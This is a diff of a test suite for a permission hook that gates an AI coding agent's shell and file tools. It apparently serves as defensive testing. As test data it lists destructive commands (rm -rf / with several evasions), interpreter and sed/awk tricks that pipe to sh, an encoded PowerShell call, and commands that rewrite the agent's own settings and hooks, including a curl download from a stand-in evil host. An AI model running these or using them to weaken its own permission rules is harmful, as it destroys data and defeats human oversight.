@@ -10,553 +10,452 @@ import {
   checkArbitraryExecution,
   normalizeUniversalPath,
   matchesPathPattern,
-  extractShellWriteTargets,
-  ClaudeSettings,
+  sanitizeArgsForLog,
+  ClaudeSettings
 } from "../src/claude-permissions.js";
+import { setupTargetRepository, HOOK_NAME } from "../scripts/setup.js";
 
-describe("1. Antigravity Payload Contract & Decision Mapping", () => {
-  const baseSettings: ClaudeSettings = {
-    "agy-cli-permission-hook-default-access": "ask",
-    "agy-cli-permission-hook-arbitrary-command-execution": "deny",
-    permissions: {
-      deny: [
-        "Bash(rm -rf:*)",
-        "Read(./secrets/**)",
-        "Edit(.claude/settings.json)",
-      ],
-      ask: ["Bash(npm publish:*)"],
-      allow: [
-        "Bash(git status)",
-        "Read",
-        "Edit",
-        "WebSearch",
-        "WebFetch(github.com:*)",
-      ],
-    },
-  };
+describe("1. Setup Installer & Antigravity hooks.json Schema", () => {
+  let tmpDir: string;
 
-  it("reads Antigravity's native { toolCall: { name, args }, workspacePaths } payload", () => {
-    const res = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "run_command",
-          args: { CommandLine: "git status" },
-        },
-        workspacePaths: ["/workspace/app"],
-      },
-      baseSettings,
-    );
-    expect(res.decision).toBe("auto_approve");
+  beforeEach(() => {
+    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agy-setup-test-"));
   });
 
-  it("NEVER allows an empty or missing CommandLine in run_command", () => {
-    const emptyRes = evaluateRequestWithSettings(
-      {
-        toolCall: { name: "run_command", args: { CommandLine: "   " } },
-        workspacePaths: ["/workspace/app"],
-      },
-      { ...baseSettings, "agy-cli-permission-hook-default-access": "allow" },
-    );
-    expect(emptyRes.decision).toBe("deny");
-
-    const missingRes = evaluateRequestWithSettings(
-      {
-        toolCall: { name: "run_command", args: {} },
-        workspacePaths: ["/workspace/app"],
-      },
-      { ...baseSettings, "agy-cli-permission-hook-default-access": "allow" },
-    );
-    expect(missingRes.decision).toBe("deny");
+  afterEach(() => {
+    fs.rmSync(tmpDir, { recursive: true, force: true });
   });
 
-  it("maps Antigravity file, search, and web tools and parameters accurately", () => {
-    const cwd = "/workspace/app";
+  it("writes Antigravity's exact nested hooks.json structure with an absolute hook path", () => {
+    const res = setupTargetRepository(tmpDir);
+    expect(fs.existsSync(res.targetHookPath)).toBe(true);
+    expect(fs.existsSync(res.targetHooksJsonPath)).toBe(true);
 
-    // view_file with AbsolutePath -> denied by Read(./secrets/**)
-    const viewSecret = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "view_file",
-          args: { AbsolutePath: "/workspace/app/secrets/api.key" },
-        },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(viewSecret.decision).toBe("deny");
+    const hooksJson = JSON.parse(fs.readFileSync(res.targetHooksJsonPath, "utf8"));
+    expect(hooksJson[HOOK_NAME]).toBeDefined();
+    expect(Array.isArray(hooksJson[HOOK_NAME].PreToolUse)).toBe(true);
 
-    // list_dir with DirectoryPath -> denied by Read(./secrets/**)
-    const listSecret = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "list_dir",
-          args: { DirectoryPath: "/workspace/app/secrets" },
-        },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(listSecret.decision).toBe("deny");
+    const ruleGroup = hooksJson[HOOK_NAME].PreToolUse[0];
+    expect(ruleGroup.matcher).toBe("*");
+    expect(Array.isArray(ruleGroup.hooks)).toBe(true);
+    expect(ruleGroup.hooks[0].type).toBe("command");
+    expect(ruleGroup.hooks[0].timeout).toBe(10);
 
-    // write_to_file & replace_file_content with TargetFile -> denied by Edit(.claude/settings.json)
-    const writeSettings = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "write_to_file",
-          args: { TargetFile: "/workspace/app/.claude/settings.json" },
-        },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(writeSettings.decision).toBe("deny");
-
-    const replaceSettings = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "replace_file_content",
-          args: { TargetFile: "/workspace/app/.claude/settings.json" },
-        },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(replaceSettings.decision).toBe("deny");
-
-    // search_web -> auto_approve
-    const searchWeb = evaluateRequestWithSettings(
-      {
-        toolCall: { name: "search_web", args: { query: "vitest docs" } },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(searchWeb.decision).toBe("auto_approve");
-
-    // read_url_content with Url -> auto_approve for github.com, force_ask for unknown
-    const readGithub = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "read_url_content",
-          args: { Url: "https://api.github.com/zen" },
-        },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(readGithub.decision).toBe("auto_approve");
-
-    const readOther = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "read_url_content",
-          args: { Url: "https://example.com" },
-        },
-        workspacePaths: [cwd],
-      },
-      baseSettings,
-    );
-    expect(readOther.decision).toBe("force_ask");
+    // Command must use an absolute path to claude-permissions.ts
+    const expectedAbsPath = res.targetHookPath.replace(/\\/g, "/");
+    expect(ruleGroup.hooks[0].command).toBe(`node "${expectedAbsPath}"`);
+    expect(path.isAbsolute(res.targetHookPath)).toBe(true);
   });
 
-  it("maps 'ask' to 'force_ask' and sanitizes invalid/typo settings values", () => {
-    const askRes = evaluateRequestWithSettings(
-      {
-        toolCall: { name: "run_command", args: { CommandLine: "npm publish" } },
-        workspacePaths: ["/workspace/app"],
-      },
-      baseSettings,
-    );
-    expect(askRes.decision).toBe("force_ask");
+  it("preserves other user hooks in hooks.json and refuses to overwrite corrupt hooks.json", () => {
+    const hooksDir = path.join(tmpDir, ".agents");
+    fs.mkdirSync(hooksDir, { recursive: true });
+    const hooksFile = path.join(hooksDir, "hooks.json");
 
-    // Invalid typo "Deny" should never pass through raw; must normalize safely
-    const typoSettings: any = {
-      "agy-cli-permission-hook-default-access": "Deny",
-      "agy-cli-permission-hook-arbitrary-command-execution": "Allow",
-      permissions: {},
-    };
-    const fallbackRes = evaluateRequestWithSettings(
-      {
-        toolCall: { name: "unknown_tool", args: {} },
-        workspacePaths: ["/workspace/app"],
-      },
-      typoSettings,
+    // Existing custom hook
+    fs.writeFileSync(
+      hooksFile,
+      JSON.stringify({
+        "my-linter-hook": {
+          PostToolUse: [{ matcher: "write_to_file", hooks: [{ type: "command", command: "./lint.sh" }] }]
+        }
+      }),
+      "utf8"
     );
-    expect(fallbackRes.decision).toBe("force_ask");
 
-    const arbTypoRes = evaluateRequestWithSettings(
-      {
-        toolCall: { name: "run_command", args: { CommandLine: "echo $(id)" } },
-        workspacePaths: ["/workspace/app"],
-      },
-      typoSettings,
-    );
-    expect(["deny", "force_ask"]).toContain(arbTypoRes.decision);
+    setupTargetRepository(tmpDir);
+    const merged = JSON.parse(fs.readFileSync(hooksFile, "utf8"));
+    expect(merged["my-linter-hook"]).toBeDefined();
+    expect(merged[HOOK_NAME]).toBeDefined();
+
+    // Corrupt JSON must throw and NOT overwrite the file
+    fs.writeFileSync(hooksFile, "{ corrupt json ", "utf8");
+    expect(() => setupTargetRepository(tmpDir)).toThrow(/Refusing to overwrite/);
+    expect(fs.readFileSync(hooksFile, "utf8")).toBe("{ corrupt json ");
   });
 });
 
-describe("2. Wrapper & Env-Var Isolation (Deny/Ask vs Allow)", () => {
+describe("2. Deny Beats Everything (Arbitrary Execution & Redirect Precedence)", () => {
+  it("enforces deny rule on 'rm -rf \"$(echo /)\"' even when arbitrary-execution is 'allow' or 'ask'", () => {
+    const settings: ClaudeSettings = {
+      "agy-cli-permission-hook-default-access": "allow",
+      "agy-cli-permission-hook-arbitrary-command-execution": "allow",
+      permissions: {
+        deny: ["Bash(rm -rf:*)"],
+        allow: ["Bash"]
+      }
+    };
+
+    const res = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "run_command", args: { CommandLine: 'rm -rf "$(echo /)"' } },
+        workspacePaths: ["/workspace"]
+      },
+      settings
+    );
+    expect(res.decision).toBe("deny");
+    expect(res.reason).toContain("denied by rule 'Bash(rm -rf:*)'");
+  });
+
+  it("enforces deny rule on 'rm -rf / > out.txt' instead of downgrading to a redirect prompt", () => {
+    const settings: ClaudeSettings = {
+      "agy-cli-permission-hook-default-access": "ask",
+      "agy-cli-permission-hook-arbitrary-command-execution": "ask",
+      permissions: {
+        deny: ["Bash(rm -rf:*)"],
+        allow: ["Bash"]
+      }
+    };
+
+    const res = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "run_command", args: { CommandLine: "rm -rf / > out.txt" } },
+        workspacePaths: ["/workspace"]
+      },
+      settings
+    );
+    expect(res.decision).toBe("deny");
+    expect(res.reason).toContain("denied by rule 'Bash(rm -rf:*)'");
+  });
+});
+
+describe("3. Self-Protection with Cwd, cd/pushd/popd, and File-Writing Commands", () => {
+  const permissiveSettings: ClaudeSettings = {
+    "agy-cli-permission-hook-default-access": "allow",
+    "agy-cli-permission-hook-arbitrary-command-execution": "allow",
+    permissions: {
+      deny: ["Edit(.env)"],
+      allow: ["Bash", "Edit", "Write", "Read"]
+    }
+  };
+
+  it("catches redirects inside args.Cwd targeting .claude or ~/.claude or ~/.gemini", () => {
+    const ws = "/workspace/app";
+    const fakeHome = "/home/testuser";
+
+    const resWsClaude = evaluateRequestWithSettings(
+      {
+        toolCall: {
+          name: "run_command",
+          args: { CommandLine: "echo '{}' > settings.json", Cwd: "/workspace/app/.claude" }
+        },
+        workspacePaths: [ws]
+      },
+      permissiveSettings,
+      fakeHome
+    );
+    expect(resWsClaude.decision).toBe("force_ask");
+    expect(resWsClaude.reason).toContain("governance file");
+
+    const resHomeClaude = evaluateRequestWithSettings(
+      {
+        toolCall: {
+          name: "run_command",
+          args: { CommandLine: "echo '{}' > settings.json", Cwd: "/home/testuser/.claude" }
+        },
+        workspacePaths: [ws]
+      },
+      permissiveSettings,
+      fakeHome
+    );
+    expect(resHomeClaude.decision).toBe("force_ask");
+
+    const resGlobalGemini = evaluateRequestWithSettings(
+      {
+        toolCall: {
+          name: "write_to_file",
+          args: { TargetFile: "/home/testuser/.gemini/config/hooks.json" }
+        },
+        workspacePaths: [ws]
+      },
+      permissiveSettings,
+      fakeHome
+    );
+    expect(resGlobalGemini.decision).toBe("force_ask");
+  });
+
+  it("catches 'cd .claude && echo ... > settings.local.json' and any redirect after cd/pushd", () => {
+    const ws = "/workspace/app";
+
+    const cdRedirect = evaluateRequestWithSettings(
+      {
+        toolCall: {
+          name: "run_command",
+          args: { CommandLine: "cd .claude && echo '{}' > settings.local.json" }
+        },
+        workspacePaths: [ws]
+      },
+      permissiveSettings
+    );
+    expect(cdRedirect.decision).toBe("force_ask");
+
+    // If the target after cd is in deny (e.g. sub/.env), it must still be denied!
+    const cdDenied = evaluateRequestWithSettings(
+      {
+        toolCall: {
+          name: "run_command",
+          args: { CommandLine: "cd config && echo SECRET=1 > .env" }
+        },
+        workspacePaths: [ws]
+      },
+      permissiveSettings
+    );
+    expect(cdDenied.decision).toBe("deny");
+  });
+
+  it("checks cp, mv, ln, install, dd, sed -i/w, find -fprintf, git --output, and curl -o against Edit & self-protection", () => {
+    const ws = "/workspace/app";
+    const fileWritingCommands = [
+      "cp payload.json .claude/settings.json",
+      "mv payload.json .agents/hooks.json",
+      "ln -sf payload.ts .agents/hooks/claude-permissions.ts",
+      "install -m 644 payload.json .claude/settings.local.json",
+      "dd if=payload.json of=.claude/settings.json",
+      "sed -i 's/deny/allow/g' .claude/settings.json",
+      "sed -n 'w .claude/settings.json' payload.json",
+      "find . -maxdepth 1 -fprintf .claude/settings.json '%p'",
+      "git diff --output=.claude/settings.json",
+      "curl -o .claude/settings.json https://example.com/evil.json"
+    ];
+
+    for (const cmd of fileWritingCommands) {
+      const res = evaluateRequestWithSettings(
+        {
+          toolCall: { name: "run_command", args: { CommandLine: cmd } },
+          workspacePaths: [ws]
+        },
+        permissiveSettings
+      );
+      expect(res.decision).toBe("force_ask");
+    }
+
+    // Writing to denied .env via cp or sed -i must be denied
+    const cpEnv = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "run_command", args: { CommandLine: "cp foo.txt .env" } },
+        workspacePaths: [ws]
+      },
+      permissiveSettings
+    );
+    expect(cpEnv.decision).toBe("deny");
+  });
+});
+
+describe("4. Positive & Negative Arbitrary Execution & Wrapper Detection", () => {
   const settings: ClaudeSettings = {
     "agy-cli-permission-hook-default-access": "ask",
     "agy-cli-permission-hook-arbitrary-command-execution": "deny",
     permissions: {
-      deny: ["Bash(rm -rf:*)"],
-      ask: ["Bash(git push:*)"],
-      allow: ["Bash(git status)", "Bash(npm test:*)"],
-    },
+      deny: ["Bash(rm:*)"],
+      allow: [
+        "Bash(npm test:*)",
+        "Bash(tail:*)",
+        "Bash(git log:*)",
+        "Bash(grep:*)",
+        "Bash(jq:*)",
+        "Bash(sed:*)",
+        "Bash(awk:*)"
+      ]
+    }
   };
 
-  it("does NOT strip wrappers or env vars when matching ALLOW rules", () => {
-    const cases = [
-      "sudo git status",
-      "doas git status",
-      "LD_PRELOAD=/tmp/evil.so git status",
-      "PAGER=/tmp/evil git status",
-      "GIT_SSH_COMMAND='ssh -i /tmp/k' git status",
-      "NODE_OPTIONS=--require=./evil.js npm test",
+  it("catches sed '1e id', sed '$e cmd', sed 's///Ie', sed 's///2e', and awk command pipes", () => {
+    const dangerous = [
+      "sed '1e id' file.txt",
+      "sed '$e uname' file.txt",
+      "sed 's/foo/bar/Ie' file.txt",
+      "sed 's/foo/bar/2e' file.txt",
+      'awk \'BEGIN{print "id" | "sh"}\'',
+      'awk \'BEGIN{print "id" |& "sh"}\''
     ];
 
-    for (const cmd of cases) {
+    for (const cmd of dangerous) {
       const res = evaluateRequestWithSettings(
         { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
-        settings,
-      );
-      expect(res.decision).not.toBe("auto_approve");
-    }
-  });
-
-  it("DOES strip wrappers, env vars, quotes, and binary paths when matching DENY and ASK rules", () => {
-    const denyCases = [
-      "/bin/rm -rf /",
-      "/usr/bin/rm -rf /tmp/foo",
-      "sudo rm -rf /",
-      "sudo -u root rm -rf /",
-      "env rm -rf /",
-      "env -i FOO=bar rm -rf /",
-      "timeout 5 rm -rf /",
-      "timeout -s KILL 10 rm -rf /",
-      "setsid rm -rf /",
-      "chroot /mnt rm -rf /",
-      "watch -n 1 rm -rf /",
-      "script -c 'rm -rf /'",
-      "nohup rm -rf /",
-      "nice -n 10 rm -rf /",
-      "\\rm -rf /",
-      "'rm' -rf /",
-    ];
-
-    for (const cmd of denyCases) {
-      const res = evaluateRequestWithSettings(
-        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
-        settings,
-      );
-      expect(res.decision).toBe("deny");
-    }
-
-    const askRes = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "run_command",
-          args: { CommandLine: "sudo /usr/bin/git push origin feature" },
-        },
-      },
-      settings,
-    );
-    expect(askRes.decision).toBe("force_ask");
-  });
-});
-
-describe("3. Multi-Subcommand Arbitrary Execution & Interpreter Bypasses", () => {
-  const allowAllBashSettings: ClaudeSettings = {
-    "agy-cli-permission-hook-default-access": "ask",
-    "agy-cli-permission-hook-arbitrary-command-execution": "deny",
-    permissions: {
-      allow: ["Bash"],
-    },
-  };
-
-  it("checks arbitrary execution on EVERY subcommand in a chain", () => {
-    const chains = [
-      "true && bash -c 'id'",
-      'ls; eval "$x"',
-      "git log | xargs rm",
-      "echo ok || python3 -c 'import os'",
-    ];
-
-    for (const cmd of chains) {
-      const res = evaluateRequestWithSettings(
-        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
-        allowAllBashSettings,
+        settings
       );
       expect(res.decision).toBe("deny");
       expect(res.reason).toContain("Arbitrary command execution detected");
     }
   });
 
-  it("catches all dangerous git flags including compact -c and -C combinations", () => {
-    const dangerousGit = [
-      "git -c alias.x='!id' x",
-      "git -c core.sshCommand='evil' fetch",
-      "git -c core.fsmonitor=evil status",
-      "git -c core.hooksPath=/tmp/hooks commit",
-      "git -c credential.helper='!evil' pull",
-      "git -ccore.pager=evil log",
-      "git -C /repo -c core.editor=evil commit",
-      "git --config-env=core.pager=MY_PAGER log",
-      "git --upload-pack=evil clone repo",
-      "git --receive-pack=evil push",
+  it("catches $IFS and globs in command names, su -c, ionice -c 3, stdbuf, and powershell", () => {
+    const cmdNameEvasions = [
+      "rm${IFS}-rf /",
+      "/bin/r[m] -rf /",
+      "/bin/rm* -rf /",
+      "su -c 'id'",
+      "powershell -ec UwB0AGEAcgB0AA==",
+      'powershell "Get-Process"'
     ];
 
-    for (const cmd of dangerousGit) {
-      expect(checkArbitraryExecution(cmd).detected).toBe(true);
-    }
-
-    // Safe git -C (uppercase directory change) must NOT be falsely flagged
-    expect(checkArbitraryExecution("git -C /repo status").detected).toBe(false);
-  });
-
-  it("catches full-path binaries, clustered shell flags, versioned interpreters, and tool execs", () => {
-    const bypassAttempts = [
-      "/bin/bash -c 'id'",
-      "bash -lc 'id'",
-      "sh -ec 'id'",
-      "python3.12 -c 'print(1)'",
-      "node --eval 'process.exit()'",
-      "node -p '1+1'",
-      "perl -E 'say 1'",
-      "ruby -e 'puts 1'",
-      "php -r 'echo 1;'",
-      "pwsh -c 'Get-Process'",
-      "powershell.exe -EncodedCommand UwB0AGEAcgB0AA==",
-      "busybox sh -c 'id'",
-      "awk '{system(\"id\")}' file.txt",
-      "sed 's/a/b/e' file.txt",
-      "tar -I gzip -xf archive.tar",
-      "tar --use-compress-program=evil -xf archive.tar",
-      "tar --to-command evil -xf archive.tar",
-      "bash <<EOF\nid\nEOF",
-    ];
-
-    for (const cmd of bypassAttempts) {
-      expect(checkArbitraryExecution(cmd).detected).toBe(true);
-    }
-  });
-});
-
-describe("4. Self-Protection of Settings, Hooks & Shell Redirections", () => {
-  const permissiveSettings: ClaudeSettings = {
-    "agy-cli-permission-hook-default-access": "allow",
-    "agy-cli-permission-hook-arbitrary-command-execution": "ask",
-    permissions: {
-      deny: ["Edit(.env)"],
-      allow: ["Bash", "Edit", "Write"],
-    },
-  };
-
-  it("never auto-approves edits to .claude/settings*.json, .agents/hooks.json, or .agents/hooks/**", () => {
-    const cwd = "/workspace/project";
-    const protectedTargets = [
-      "/workspace/project/.claude/settings.json",
-      "/workspace/project/.claude/settings.local.json",
-      "/workspace/project/.agents/hooks.json",
-      "/workspace/project/.agents/hooks/claude-permissions.ts",
-    ];
-
-    for (const target of protectedTargets) {
+    for (const cmd of cmdNameEvasions) {
       const res = evaluateRequestWithSettings(
-        {
-          toolCall: { name: "write_to_file", args: { TargetFile: target } },
-          workspacePaths: [cwd],
-        },
-        permissiveSettings,
+        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
+        settings
       );
-      expect(res.decision).toBe("force_ask");
+      expect(res.decision).toBe("deny");
+    }
+
+    // ionice -c 3 rm -rf / and stdbuf -oL rm -rf / must match Bash(rm:*) deny rule
+    for (const wrapped of ["ionice -c 3 rm -rf /", "stdbuf -o L rm -rf /"]) {
+      const res = evaluateRequestWithSettings(
+        { toolCall: { name: "run_command", args: { CommandLine: wrapped } } },
+        settings
+      );
+      expect(res.decision).toBe("deny");
+      expect(res.reason).toContain("Bash(rm:*)");
     }
   });
 
-  it("intercepts shell output redirections (>, >>, tee) against Edit/Write and self-protection rules", () => {
-    const cwd = "/workspace/project";
+  it("NEGATIVE TESTS: allows everyday developer commands including 2>&1, git log, grep, jq '{a,b}', and safe sed/awk", () => {
+    const safeEverydayCommands = [
+      "npm test 2>&1 | tail -20",
+      "git log --oneline",
+      "grep -rn foo src",
+      "jq '{a,b}' data.json",
+      'jq "{a,b}" data.json',
+      "sed 's/foo/bar/g' file.txt",
+      "awk '{print $1 || $2}' file.txt"
+    ];
 
-    // Redirecting to denied Edit(.env) -> deny
-    const redirectDenied = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "run_command",
-          args: { CommandLine: "echo SECRET=1 > .env" },
-        },
-        workspacePaths: [cwd],
-      },
-      permissiveSettings,
-    );
-    expect(redirectDenied.decision).toBe("deny");
-
-    // Redirecting to .claude/settings.local.json -> force_ask
-    const redirectSettings = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "run_command",
-          args: {
-            CommandLine:
-              'echo \'{"permissions":{"allow":["Bash"]}}\' > .claude/settings.local.json',
-          },
-        },
-        workspacePaths: [cwd],
-      },
-      permissiveSettings,
-    );
-    expect(redirectSettings.decision).toBe("force_ask");
-
-    // Piping into tee .agents/hooks/claude-permissions.ts -> force_ask
-    const teeHook = evaluateRequestWithSettings(
-      {
-        toolCall: {
-          name: "run_command",
-          args: {
-            CommandLine:
-              "cat payload.ts | tee .agents/hooks/claude-permissions.ts",
-          },
-        },
-        workspacePaths: [cwd],
-      },
-      permissiveSettings,
-    );
-    expect(teeHook.decision).toBe("force_ask");
+    for (const cmd of safeEverydayCommands) {
+      expect(checkArbitraryExecution(cmd).detected).toBe(false);
+      const res = evaluateRequestWithSettings(
+        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
+        settings
+      );
+      expect(res.decision).toBe("auto_approve");
+    }
   });
 });
 
-describe("5. Path Semantics (/ vs //), Gitignore Depth, Symlinks & Global Settings", () => {
-  it("distinguishes settings-relative /path from filesystem-absolute //path", () => {
-    const cwd = "/workspace/app";
+describe("5. Broken Settings JSON, Scoped User Rules, /tmp Allow Isolation & Missing Path Args", () => {
+  let tmpDir: string;
 
-    // /secrets/** is relative to workspace root
-    expect(
-      matchesPathPattern("/workspace/app/secrets/key.pem", "/secrets/**", cwd),
-    ).toBe(true);
-    expect(matchesPathPattern("/secrets/key.pem", "/secrets/**", cwd)).toBe(
-      false,
-    );
-
-    // //etc/** is filesystem-absolute
-    expect(matchesPathPattern("/etc/passwd", "//etc/**", cwd)).toBe(true);
-    expect(
-      matchesPathPattern("/workspace/app/etc/passwd", "//etc/**", cwd),
-    ).toBe(false);
-
-    // //c/Users/... is Windows drive absolute
-    expect(
-      matchesPathPattern(
-        "C:\\Users\\tj_co\\roms\\oot.z64",
-        "//c/Users/tj_co/roms/**",
-        cwd,
-      ),
-    ).toBe(true);
-    expect(
-      matchesPathPattern(
-        "/mnt/c/Users/tj_co/roms/oot.z64",
-        "//c/Users/tj_co/roms/**",
-        cwd,
-      ),
-    ).toBe(true);
+  beforeEach(() => {
+    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agy-cfg-test-"));
   });
 
-  it("matches patterns without slashes at any directory depth (gitignore semantics)", () => {
-    const cwd = "/workspace/app";
-
-    // No slash: matches at root AND nested directories
-    expect(matchesPathPattern("/workspace/app/.env", ".env", cwd)).toBe(true);
-    expect(matchesPathPattern("/workspace/app/config/.env", ".env", cwd)).toBe(
-      true,
-    );
-    expect(
-      matchesPathPattern("/workspace/app/packages/api/.env", ".env", cwd),
-    ).toBe(true);
-
-    // Explicit ./ slash: anchored to workspace root only
-    expect(matchesPathPattern("/workspace/app/.env", "./.env", cwd)).toBe(true);
-    expect(
-      matchesPathPattern("/workspace/app/config/.env", "./.env", cwd),
-    ).toBe(false);
+  afterEach(() => {
+    fs.rmSync(tmpDir, { recursive: true, force: true });
   });
 
-  describe("Symlink resolution & global settings merging on real filesystem", () => {
-    let tmpDir: string;
-    let workspaceDir: string;
-    let secretDir: string;
+  it("blocks execution (fail-closed) when a settings file contains invalid JSON", () => {
+    const ws = path.join(tmpDir, "ws");
+    fs.mkdirSync(path.join(ws, ".claude"), { recursive: true });
+    fs.writeFileSync(path.join(ws, ".claude", "settings.json"), "{ broken json", "utf8");
 
-    beforeEach(() => {
-      tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agy-perm-test-"));
-      workspaceDir = path.join(tmpDir, "workspace");
-      secretDir = path.join(tmpDir, "outside-secrets");
-      fs.mkdirSync(workspaceDir, { recursive: true });
-      fs.mkdirSync(secretDir, { recursive: true });
-      fs.writeFileSync(path.join(secretDir, "id_rsa"), "PRIVATE KEY", "utf8");
-    });
+    const loaded = loadMergedClaudeSettings(ws, path.join(tmpDir, "home"));
+    const res = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "run_command", args: { CommandLine: "git status" } },
+        workspacePaths: [ws]
+      },
+      loaded
+    );
+    expect(res.decision).toBe("deny");
+    expect(res.reason).toContain("Invalid JSON in settings file");
+  });
 
-    afterEach(() => {
-      fs.rmSync(tmpDir, { recursive: true, force: true });
-    });
+  it("anchors /path and ./path in ~/.claude/settings.json to the user home directory", () => {
+    const fakeHome = path.join(tmpDir, "home");
+    const ws = path.join(tmpDir, "ws");
+    fs.mkdirSync(path.join(fakeHome, ".claude"), { recursive: true });
+    fs.mkdirSync(path.join(ws, ".claude"), { recursive: true });
 
-    it("resolves symlinks inside the workspace pointing to denied targets outside", () => {
-      const symlinkPath = path.join(workspaceDir, "innocent-link");
-      fs.symlinkSync(path.join(secretDir, "id_rsa"), symlinkPath);
-
-      const settings: ClaudeSettings = {
-        "agy-cli-permission-hook-default-access": "allow",
+    fs.writeFileSync(
+      path.join(fakeHome, ".claude", "settings.json"),
+      JSON.stringify({
         permissions: {
-          deny: [
-            `Read(//${normalizeUniversalPath(secretDir).replace(/^\/+/, "")}/**)`,
-          ],
-          allow: ["Read"],
-        },
-      };
+          deny: ["Read(/private-notes/**)"]
+        }
+      }),
+      "utf8"
+    );
+    fs.writeFileSync(
+      path.join(ws, ".claude", "settings.json"),
+      JSON.stringify({
+        permissions: {
+          allow: ["Read"]
+        }
+      }),
+      "utf8"
+    );
 
-      const res = evaluateRequestWithSettings(
-        {
-          toolCall: { name: "view_file", args: { AbsolutePath: symlinkPath } },
-          workspacePaths: [workspaceDir],
+    const merged = loadMergedClaudeSettings(ws, fakeHome);
+    const res = evaluateRequestWithSettings(
+      {
+        toolCall: {
+          name: "view_file",
+          args: { AbsolutePath: path.join(fakeHome, "private-notes", "diary.txt") }
         },
-        settings,
-      );
-      expect(res.decision).toBe("deny");
+        workspacePaths: [ws]
+      },
+      merged,
+      fakeHome
+    );
+    expect(res.decision).toBe("deny");
+  });
+
+  it("does NOT widen Edit(/tmp/**) allow rules to the system /tmp directory", () => {
+    const ws = "/workspace/app";
+    const settings: ClaudeSettings = {
+      "agy-cli-permission-hook-default-access": "ask",
+      permissions: {
+        allow: ["Edit(/tmp/**)"]
+      }
+    };
+
+    // Inside workspace /workspace/app/tmp/foo.txt -> allowed
+    const wsTmp = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "write_to_file", args: { TargetFile: "/workspace/app/tmp/foo.txt" } },
+        workspacePaths: [ws]
+      },
+      settings
+    );
+    expect(wsTmp.decision).toBe("auto_approve");
+
+    // System /tmp/foo.txt -> must NOT match Edit(/tmp/**) allow rule!
+    const sysTmp = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "write_to_file", args: { TargetFile: "/tmp/foo.txt" } },
+        workspacePaths: [ws]
+      },
+      settings
+    );
+    expect(sysTmp.decision).toBe("force_ask");
+  });
+
+  it("prompts (force_ask) when a file tool is called with no recognized path argument instead of checking cwd", () => {
+    const ws = "/workspace/app";
+    const settings: ClaudeSettings = {
+      "agy-cli-permission-hook-default-access": "ask",
+      permissions: {
+        allow: ["Read(./**)"]
+      }
+    };
+
+    const res = evaluateRequestWithSettings(
+      {
+        toolCall: { name: "list_dir", args: { UnknownPathField: "/home/user/.ssh" } },
+        workspacePaths: [ws]
+      },
+      settings
+    );
+    expect(res.decision).toBe("force_ask");
+    expect(res.reason).toContain("without a recognized path argument");
+  });
+
+  it("redacts file content and inline secrets when sanitizing arguments for logging", () => {
+    const sanitized = sanitizeArgsForLog({
+      TargetFile: "/workspace/app/index.ts",
+      CodeContent: "const secret = 'super-secret-value';",
+      CommandLine: "OPENAI_API_KEY=sk-1234567890abcdef npm test"
     });
-
-    it("merges global user settings with project settings", () => {
-      const fakeHome = path.join(tmpDir, "home");
-      fs.mkdirSync(path.join(fakeHome, ".claude"), { recursive: true });
-      fs.mkdirSync(path.join(workspaceDir, ".claude"), { recursive: true });
-
-      fs.writeFileSync(
-        path.join(fakeHome, ".claude", "settings.json"),
-        JSON.stringify({
-          permissions: {
-            deny: ["Bash(curl:*)"],
-          },
-        }),
-        "utf8",
-      );
-
-      fs.writeFileSync(
-        path.join(workspaceDir, ".claude", "settings.json"),
-        JSON.stringify({
-          permissions: {
-            allow: ["Bash"],
-          },
-        }),
-        "utf8",
-      );
-
-      const merged = loadMergedClaudeSettings(workspaceDir, fakeHome);
-      const res = evaluateRequestWithSettings(
-        {
-          toolCall: {
-            name: "run_command",
-            args: { CommandLine: "curl https://example.com" },
-          },
-          workspacePaths: [workspaceDir],
-        },
-        merged,
-      );
-      expect(res.decision).toBe("deny");
-    });
+    expect(sanitized.CodeContent).toContain("[REDACTED_CONTENT");
+    expect(sanitized.CommandLine).toContain("OPENAI_API_KEY=[REDACTED]");
+    expect(sanitized.CommandLine).not.toContain("sk-1234567890abcdef");
   });
 });
